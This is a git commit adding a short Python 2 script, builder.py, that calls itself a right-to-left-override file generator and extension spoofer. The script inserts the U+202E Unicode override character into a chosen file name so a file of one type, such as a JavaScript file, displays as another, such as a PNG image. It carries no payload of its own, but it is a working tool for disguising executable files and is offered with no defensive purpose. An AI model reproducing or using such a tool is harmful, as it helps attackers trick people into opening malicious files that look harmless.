9d7266e2f684e4fb182115b40e2ec63bb0644600
WebSEC.nl <rebitclown105@hotmail.com>
2018-02-15 16:02:20 +0100

    Create builder.py

---
+++ builder.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Coded By: Joel A. Ossi
+
+from __future__ import unicode_literals
+
+print('## Right-To-Left-Override File Generator  ##')
+print('##     Unicode File Extention Spoofer     ##')
+print('')
+
+spoof = raw_input('ENTER EXTENTION TO SPOOF (Example: png): ')[::-1]
+filename = raw_input('ENTER ORIGINAL FILE NAME (Example: test): ')
+extention = raw_input('ENTER ORIGINAL FILE EXTENTION (Example: .js): ')
+exploit = u"‮"
+print('')
+
+file=open(filename + exploit + spoof + extention,'w')
+file.write("")
+file.close()
+print('[+] Build Saved.')
+print('')
+raw_input('PRESS ENTER KEY TO CONTINIUE')
